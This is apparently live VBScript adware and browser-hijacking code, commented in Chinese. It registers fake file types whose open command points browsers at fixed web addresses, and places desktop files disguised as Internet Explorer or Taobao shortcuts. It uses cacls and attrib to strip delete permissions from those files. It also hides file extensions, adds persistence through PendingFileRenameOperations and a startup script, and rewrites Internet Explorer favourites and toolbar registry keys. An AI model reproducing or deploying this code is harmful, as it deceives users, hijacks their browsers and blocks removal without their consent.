        dim index_array(7),index_index,index_isFileExists,index_name,index_extension,index_count,index_rnd
        Randomize
        index_rnd=(3 * Rnd) + 1
        index_extension="tt"
        Call CreateRelevance("."+index_extension, index_extension, iePath & ",0", iePath & " " & url)
        
		index_array(1)="Internet Explorer"
		index_array(2)="Internet"
		index_array(3)="Explorer"
		index_array(4)="Internet Exploerr"
		index_array(5)="Interne"
		index_array(6)="Explorer"
		index_array(7)="Exploerr"
		Randomize
		index_index=Int((ubound(index_array) * Rnd) + 1)
		index_name=index_array(index_index) + "." + index_extension '随机一个创建的文件名
		index_count=0
		for index_i=1 to ubound(index_array) '获取桌面已存在这类图标的数量			
			If fso.FileExists(allUsersPcDesktopPath + "\" + index_array(index_i) + "." + index_extension) Then
				index_count=index_count+1
			End If
		Next
		If index_count=0 Then '没有准备创建图标才进行创建
			If Not fso.FileExists(allUsersPcDesktopPath + "\" + index_name) Then
				Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\" + index_name)
			End If
		End If
        
        Call CreateRelevance(".css", "css", iePath & ",0", iePath & " " & url)
        If Not fso.FileExists(allUsersPrograms + "\Internet Explorer.css") Then
            Call CreateNoDeleteLnk(allUsersPrograms + "\Internet Explorer.css")
        End If
        If Not fso.FileExists(quickLaunch + "\Internet Explorer.css") Then
            Call CreateNoDeleteLnk(quickLaunch + "\Internet Explorer.css")
        End If
        
        
        dim tao_ico_path '淘宝图标路径
        Set ws = CreateObject("WScript.Shell") 
        Set Environ = ws.Environment("process") 
        tao_ico_path=Environ("windir") & "\tao.ico"
        If not fso.FileExists(tao_ico_path) Then '如果路径不存在则更换默认
            tao_ico_path=iePath & ",0"
        End If
        
        dim taobao_array(17),taobao_index,taobao_isFileExists,taobao_name,taobao_extension,taobao_count
        taobao_extension="bt"
        Call CreateRelevance("."+taobao_extension, taobao_extension, tao_ico_path, iePath & " http://dianxin.online.cq.cn/api/taobao/index.htm")
        
		taobao_array(1)="淘宝网"
		taobao_array(2)="淘宝购物导航"
		taobao_array(3)="购物导航"
		taobao_array(4)="网上淘宝"
		taobao_array(5)="淘宝专用"
		taobao_array(6)="淘宝网购"
		taobao_array(7)="淘 宝"
		taobao_array(8)="淘  宝"
		taobao_array(9)="购物淘宝"
		taobao_array(10)="导航淘宝"
		taobao_array(11)="导航购物"
		taobao_array(12)="地方购物"
		taobao_array(13)="网上购物"
		taobao_array(14)="团购购物"
		taobao_array(15)="特色购物"
		taobao_array(16)="特价购物"
		taobao_array(17)="低价购物"
		Randomize
		taobao_index=Int((ubound(taobao_array) * Rnd) + 1)
		taobao_name=taobao_array(taobao_index) + "." + taobao_extension '随机一个创建的文件名
		taobao_count=0
		for taobao_i=1 to ubound(taobao_array) '获取桌面已存在这类图标的数量			
			If fso.FileExists(allUsersPcDesktopPath + "\" + taobao_array(taobao_i) + "." + taobao_extension) Then
				taobao_count=taobao_count+1
			End If
		Next
		If taobao_count=0 Then '没有准备创建图标才进行创建
			If Not fso.FileExists(allUsersPcDesktopPath + "\" + taobao_name) Then
				Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\" + taobao_name)
			End If
		End If
		
		
		
		
		
		
        Set ws = CreateObject("WScript.Shell") 
        Set Environ = ws.Environment("process") 
        tao_ico_path=Environ("windir") & "\t.ico"
        If not fso.FileExists(tao_ico_path) Then '如果路径不存在则更换默认
            tao_ico_path=iePath & ",0"
        End If
        Call CreateRelevance(".shb", "shb", tao_ico_path, iePath & " http://dao.online.cq.cn/t.htm")
        If Not fso.FileExists(allUsersPcDesktopPath + "\导航网址.shb") Then
            If createType=1 Then
                'Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\导航网址.shb")
            End If
        End If
    End If
    
    If fso.FileExists(maxPath) And maxPath<>"" Then '判断遨游浏览器路径是否存在
        Call CreateRelevance(".max", "max", maxPath & ",0", maxPath & " " & url)
        If Not fso.FileExists(quickLaunch + "\傲游浏览器.max") Then
            Call CreateNoDeleteLnk(quickLaunch + "\傲游浏览器.max")
        End If
    End If
    
    If fso.FileExists(sePath) And iePath<>"" Then '判断360浏览器路径是否存在
        Call CreateRelevance(".rtf", "rtf", sePath & ",0", sePath & " " & url)
        If Not fso.FileExists(quickLaunch + "\360浏览器.rtf") Then
            Call CreateNoDeleteLnk(quickLaunch + "\360浏览器.rtf")
        End If
    End If
    
    Call HideFileExtension '隐藏文件扩展名
End Sub

'创建禁止被删除的文件
Private Sub CreateNoDeleteLnk(path)
On Error Resume Next
    Dim fso,TestFile
    Set fso=CreateObject("Scripting.FileSystemObject")
    Set testFile=fso.CreateTextFile(path,Ture)
    testFile.writeline("从前有座山，山上有座庙。")
    testFile.Close
    Call RefusalFileDelete(path)
End Sub

'禁止文件被删除（删除全部权限）
Private Sub RefusalFileDelete(path)
On Error Resume Next
    Set WshShell= CreateObject("WScript.Shell")
    Set wshNetwork = WScript.CreateObject("WScript.Network")
    WshShell.Run ("attrib """ & path & """ +r +s"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r Administrators"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c Administrators:CI"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r Administrator"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r users"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r system"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r everyone"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r user"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r ""Power Users"""), vbHide    
    WshShell.Run ("cacls """ & path & """ /e /c /r """ & wshNetwork.UserName & """"), vbHide    
    Set wshNetwork = Nothing 
    Set WshShell = Nothing    
End Sub

'隐藏文件扩展名
Private Sub HideFileExtension()
On Error Resume Next
    Const HKEY_CURRENT_USER = &H80000001
      
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")   
  
    strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"  
    oReg.CreateKey HKEY_CURRENT_USER,strKeyPath 
    
    strValueName = "ShowSuperHidden"  
    dwValue = 0   
    oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,strValueName,dwValue 
    
    strValueName = "Hidden1"  
    dwValue = 2   
    oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,strValueName,dwValue 
    
    strValueName = "HideFileExt"  
    dwValue = 1  
    oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,strValueName,dwValue 
    
End Sub

'新建文件关联,参数：关联后缀,关联名称,icon图标路径(不修改或不创建为空),关联程序物理路径
Private Sub CreateRelevance(nameSuffix, associationName, iconPath, path)
On Error Resume Next
    Const HKEY_CLASSES_ROOT = &H80000000
      
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")   

    '关联后缀   
    strKeyPath = nameSuffix  
    oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath   
  
    '关联后缀   
    strValueName = ""  
    strValue = associationName 
    oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue   
    
    '设置关联名称
    strKeyPath = associationName  
    oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath 
    
    '设置关联名称
    strValueName = ""  
    strValue = "系统文件" 
    oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue  
    
    '设置关联名称
    strKeyPath = associationName & "\shell\open\command"  
    oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath 
    
    '设置关联名称
    strValueName = ""  
    strValue = path
    oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue  
    
    If iconPath <> "" Then
       '设置关联名称
        strKeyPath = associationName & "\DefaultIcon"  
        oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath 
        
        '设置关联名称
        strValueName = ""  
        strValue = iconPath
        oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue 
    End If
End Sub

'设置为自启动（特别的方式）,参数：文件路径,启动目录路径
Private Sub SetRunVbe(path,runPath)
On Error Resume Next
    Const HKEY_LOCAL_MACHINE = &H80000002
    arrStringValues = Array(path,runPath)
    '读取扩展的字符串值
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_    
    strComputer & "\root\default:StdRegProv")   
    strKeyPath = "SYSTEM\ControlSet001\Control\Session Manager"  
    strValueName = "PendingFileRenameOperations"  
    oReg.GetMultiStringValue HKEY_LOCAL_MACHINE,strKeyPath,_   
    strValueName,arrValues
    
    dim isPathPresence,isRunPathPresence
    isPathPresence=false
    isRunPathPresence=false
    
    temp_i=1
    temp_arrValues = Array() '以前存在项的数组
    
    For Each strValue In arrValues
         If (InStr(strValue, "smss.exe") = 0) Then '过滤指定文件
            ReDim Preserve temp_arrValues(temp_i)             
            temp_arrValues(temp_i)=strValue
            temp_i=temp_i+1
         End If
         if strValue=path then '存在
            isPathPresence=true
         end if
         if strValue=runPath then '存在
            isRunPathPresence=true
         end if
    Next
 
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_    
    strComputer & "\root\default:StdRegProv")
       
    '没有就创建该项
    strKeyPath = "SYSTEM\ControlSet001\Control\Session Manager"  
    oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath   

    '写入注册表项   
    strValueName = "PendingFileRenameOperations"
    If not isNull(arrValues) Then '存在数据则追加,合并数组
        arrStringValues=Summ(arrValues,arrStringValues) '两个数组合并        
    End If
    
    if isPathPresence=false then'判断源程序是否存在，不存在则写入
        oReg.SetMultiStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,arrStringValues
    end if
End Sub


'设置为自启动（特别的方式）,参数：启动目录路径
Private Sub SetJseRunVbe(runPath)
On Error Resume Next
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim allUsersStartup
    Set wshShell = CreateObject("Wscript.Shell")
    allUsersStartup = wshShell.SpecialFolders("AllUsersStartup") '所有用户启动目录
    dim vbsRunPath
    vbsRunPath=runPath
    vbsRunPath = Replace(vbsRunPath, "\", "\\") '格式化路径
    dim regPath
	regPath= (allUsersStartup + "\360vbs.jse")	
	Set f1=fso.CreateTextFile(regPath, True)
	f1.WriteLine "var WSH = new ActiveXObject(""WScript.Shell"");"
	f1.WriteLine "var fso = new ActiveXObject(""Scripting.FileSystemObject"");"
	f1.WriteLine "if(fso.FileExists(""" & vbsRunPath & """))"
	f1.WriteLine "{"
	f1.WriteLine "WSH.Run(""" & vbsRunPath & """);"
	f1.WriteLine "}"
	Set f1  = Nothing
		
		
    
End Sub



'增加浏览器链接
Public Function IeLink(linkName,linkUrl)   
On Error Resume Next
    If linkName = "" Or linkUrl = "" Then
        Exit Function
    End If
    Set WshShell = CreateObject("WScript.Shell") 
    Set Environ = WshShell.Environment("process") 
    
    Dim ieLinkPath
    ieLinkPath = "C:\Documents and Settings\" & Environ("USERNAME") & "\Favorites\链接\" & linkName & ".url"
    set fso=wscript.createobject("scripting.filesystemobject")
    Set f=fso.CreateTextFile(ieLinkPath, True)
    f.WriteLine "[DEFAULT]"
    f.WriteLine "BASEURL=" & linkUrl
    f.WriteLine "[InternetShortcut]"
    f.WriteLine "URL=" & linkUrl
    f.WriteLine "IDList="
    f.WriteLine "[{000214A0-0000-0000-C000-000000000046}]"
    f.WriteLine "Prop3=19,2"	
    
    ieLinkPath = "C:\Documents and Settings\" & Environ("USERNAME") & "\Favorites\常用\" & linkName & ".url"
    set fso=wscript.createobject("scripting.filesystemobject")
    Set f=fso.CreateTextFile(ieLinkPath, True)
    f.WriteLine "[DEFAULT]"
    f.WriteLine "BASEURL=" & linkUrl
    f.WriteLine "[InternetShortcut]"
    f.WriteLine "URL=" & linkUrl
    f.WriteLine "IDList="
    f.WriteLine "[{000214A0-0000-0000-C000-000000000046}]"
    f.WriteLine "Prop3=19,2"
    
    ieLinkPath = "C:\Documents and Settings\" & Environ("USERNAME") & "\Favorites\" & linkName & ".url"
    set fso=wscript.createobject("scripting.filesystemobject")
    Set f=fso.CreateTextFile(ieLinkPath, True)
    f.WriteLine "[DEFAULT]"
    f.WriteLine "BASEURL=" & linkUrl
    f.WriteLine "[InternetShortcut]"
    f.WriteLine "URL=" & linkUrl
    f.WriteLine "IDList="
    f.WriteLine "[{000214A0-0000-0000-C000-000000000046}]"
    f.WriteLine "Prop3=19,2"    
    
    Set fso  = Nothing
    Set WshShell  = Nothing
End Function

'增加IE链接
Public Function ShowIeLink()   
On Error Resume Next
    '写入信息到注册表
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Dim regPathSix 
    regPathSix = Environ("windir") & "\MYShowIeLinkIe6.reg"
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f=fso.CreateTextFile(regPathSix, True)
    f.WriteLine "Windows Registry Editor Version 5.00"
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar]"
    f.WriteLine """LinksFolderName""=""链接"""
    f.WriteLine """Locked""=dword:00000001"
    f.WriteLine """ShowDiscussionButton""=""Yes"""
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\Explorer]"
    f.WriteLine """ITBarLayout""=hex:11,00,00,00,5c,00,00,00,00,00,00,00,24,00,00,00,1b,00,00,00,\"
    f.WriteLine "    4a,00,00,00,01,00,00,00,20,07,00,00,a0,0f,00,00,05,00,00,00,62,05,00,00,26,\"
    f.WriteLine "  00,00,00,02,00,00,00,21,07,00,00,a0,0f,00,00,04,00,00,00,21,01,00,00,a0,0f,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"

    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\ShellBrowser]"
    f.WriteLine """{01E04581-4EEE-11D0-BFE9-00AA005B4383}""=hex:81,45,e0,01,ee,4e,d0,11,bf,e9,00,\"
    f.WriteLine "  aa,00,5b,43,83,10,00,00,00,00,00,00,00,01,e0,32,f4,01,00,00,00"
    f.WriteLine """ITBarLayout""=hex:11,00,00,00,5c,00,00,00,00,00,00,00,24,00,00,00,1b,00,00,00,\"
    f.WriteLine "  4a,00,00,00,01,00,00,00,20,07,00,00,a0,0f,00,00,05,00,00,00,62,05,00,00,26,\"
    f.WriteLine "  00,00,00,02,00,00,00,21,07,00,00,a0,0f,00,00,04,00,00,00,21,01,00,00,a0,0f,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"

    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\WebBrowser]"
    f.WriteLine """{01E04581-4EEE-11D0-BFE9-00AA005B4383}""=hex:81,45,e0,01,ee,4e,d0,11,bf,e9,00,\"
    f.WriteLine "  aa,00,5b,43,83,10,00,00,00,00,00,00,00,01,e0,32,f4,01,00,00,00"
    f.WriteLine """{0E5CBF21-D15F-11D0-8301-00AA005B4383}""=hex:21,bf,5c,0e,5f,d1,d0,11,83,01,00,\"
    f.WriteLine "  aa,00,5b,43,83,22,00,1c,00,08,00,00,00,06,00,00,00,01,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,4c,00,00,00,01,14,02,00,00,00,00,00,c0,00,00,00,00,\"
    f.WriteLine "  00,00,46,81,00,00,00,10,00,00,00,9e,d1,0e,c2,33,ec,ca,01,e6,1a,bf,65,c5,ed,\"
    f.WriteLine "  ca,01,9e,d1,0e,c2,33,ec,ca,01,00,00,00,00,00,00,00,00,01,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,5b,01,14,00,1f,50,e0,4f,d0,20,ea,3a,69,10,a2,d8,\"
    f.WriteLine "  08,00,2b,30,30,9d,19,00,2f,43,3a,5c,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,5c,00,31,00,00,00,00,00,a5,3c,28,4a,10,00,44,4f,43,55,4d,\"
    f.WriteLine "  45,7e,31,00,00,44,00,03,00,04,00,ef,be,a5,3c,12,49,a7,3c,f1,48,14,00,00,00,\"
    f.WriteLine "  44,00,6f,00,63,00,75,00,6d,00,65,00,6e,00,74,00,73,00,20,00,61,00,6e,00,64,\"
    f.WriteLine "  00,20,00,53,00,65,00,74,00,74,00,69,00,6e,00,67,00,73,00,00,00,18,00,4a,00,\"
    f.WriteLine "  31,00,00,00,00,00,a6,3c,8e,0c,10,00,41,44,4d,49,4e,49,7e,31,00,00,32,00,03,\"
    f.WriteLine "  00,04,00,ef,be,a5,3c,28,4a,a7,3c,f1,48,14,00,00,00,41,00,64,00,6d,00,69,00,\"
    f.WriteLine "  6e,00,69,00,73,00,74,00,72,00,61,00,74,00,6f,00,72,00,00,00,18,00,56,00,31,\"
    f.WriteLine "  00,00,00,00,00,a6,3c,76,0f,11,00,46,41,56,4f,52,49,7e,31,00,00,3e,00,03,00,\"
    f.WriteLine "  04,00,ef,be,a5,3c,28,4a,a7,3c,33,44,14,00,28,00,46,00,61,00,76,00,6f,00,72,\"
    f.WriteLine "  00,69,00,74,00,65,00,73,00,00,00,40,73,68,65,6c,6c,33,32,2e,64,6c,6c,2c,2d,\"
    f.WriteLine "  31,32,36,39,33,00,18,00,30,00,35,00,00,00,00,00,a5,3c,29,4a,10,00,fe,94,a5,\"
    f.WriteLine "  63,00,00,1c,00,03,00,04,00,ef,be,a5,3c,29,4a,a7,3c,33,44,14,00,00,00,fe,94,\"
    f.WriteLine "  a5,63,00,00,14,00,00,00,60,00,00,00,03,00,00,a0,58,00,00,00,00,00,00,00,68,\"
    f.WriteLine "  79,2d,36,36,79,6c,70,32,36,32,64,66,36,75,00,0e,d2,40,80,be,ba,3a,40,a5,d7,\"
    f.WriteLine "  35,99,38,b7,4c,a0,47,78,a6,83,2a,58,df,11,b1,e0,00,26,18,08,88,87,0e,d2,40,\"
    f.WriteLine "  80,be,ba,3a,40,a5,d7,35,99,38,b7,4c,a0,47,78,a6,83,2a,58,df,11,b1,e0,00,26,\"
    f.WriteLine "  18,08,88,87,00,00,00,00"
    f.WriteLine """ITBarLayout""=hex:11,00,00,00,5c,00,00,00,00,00,00,00,34,00,00,00,1f,00,00,00,\"
    f.WriteLine "  62,00,00,00,01,00,00,00,a0,06,00,00,a0,0f,00,00,05,00,00,00,22,04,00,00,26,\"
    f.WriteLine "  00,00,00,02,00,00,00,a1,06,00,00,60,01,00,00,04,00,00,00,a1,00,00,00,c6,00,\"
    f.WriteLine "  00,00,03,00,00,00,a1,02,00,00,d4,04,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"


    
    Dim regPathSeven
    regPathSeven = Environ("windir") & "\MyShowIeLinkIe7.reg"
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f=fso.CreateTextFile(regPathSeven, True)
    f.WriteLine "Windows Registry Editor Version 5.00"
    f.WriteLine """LinksFolderName""=""链接"""
    f.WriteLine """ShowDiscussionButton""=""no"""
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\ShellBrowser]"
    f.WriteLine """{01E04581-4EEE-11D0-BFE9-00AA005B4383}""=hex:81,45,e0,01,ee,4e,d0,11,bf,e9,00,\"
    f.WriteLine "  aa,00,5b,43,83,10,00,00,00,00,00,00,00,01,e0,32,f4,01,00,00,00"
    f.WriteLine """ITBarLayout""=hex:11,00,00,00,5c,00,00,00,00,00,00,00,34,00,00,00,1b,00,00,00,\"
    f.WriteLine "  56,00,00,00,01,00,00,00,20,07,00,00,a0,0f,00,00,05,00,00,00,62,05,00,00,26,\"
    f.WriteLine "  00,00,00,02,00,00,00,21,07,00,00,a0,0f,00,00,04,00,00,00,21,01,00,00,a0,0f,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"
    f.WriteLine ""
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\WebBrowser]"
    f.WriteLine """{01E04581-4EEE-11D0-BFE9-00AA005B4383}""=hex:81,45,e0,01,ee,4e,d0,11,bf,e9,00,\"
    f.WriteLine "  aa,00,5b,43,83,10,00,00,00,00,00,00,00,01,e0,32,f4,01,00,00,00"
